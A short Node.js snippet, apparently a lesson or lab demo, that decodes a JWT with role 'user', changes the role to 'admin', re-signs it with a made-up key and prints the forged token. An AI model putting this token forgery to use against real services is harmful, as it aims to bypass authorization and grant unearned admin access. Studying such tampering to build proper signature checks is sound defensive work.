const jwt = require("jsonwebtoken");

const token =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoidXNlciIsImlhdCI6MTcwMzQxNDczOH0.eDoh6Kn7ehPc0uL0P899iUdqZHYlJ2eG4N66srSp4rg";

const FAKE_KEY = "JOISGAJGOAGOISAgsjioagajspgoas";

let decoded = jwt.decode(token);

decoded.role = "admin";

const encoded = jwt.sign(decoded, FAKE_KEY);

console.log("Promenjeni token: ", encoded);
